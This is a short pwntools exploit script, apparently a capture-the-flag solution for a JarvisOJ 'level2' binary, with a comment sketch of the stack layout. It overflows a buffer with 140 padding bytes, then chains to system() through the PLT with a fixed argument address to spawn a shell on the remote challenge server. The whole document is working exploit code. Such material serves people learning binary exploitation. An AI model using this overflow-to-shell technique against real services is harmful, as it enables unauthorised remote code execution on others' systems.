# -*- coding: utf-8 -*-
from pwn import *

conn = remote('pwn2.jarvisoj.com', 9878)
#conn = remote('127.0.0.1', 12001)
l2 = ELF('level2')
conn.recvline()
payload = 140 * 'A' + p32(l2.plt['system']) + 4 * 'A' + p32(0x0804a024)
conn.sendline(payload)
conn.interactive()

##
##H
##system_arg (4 Byte)
##system_ret (4 Byte)
##ret (4 Byte)
##rbp (4 Byte)
##136 Byte
##
##
##L

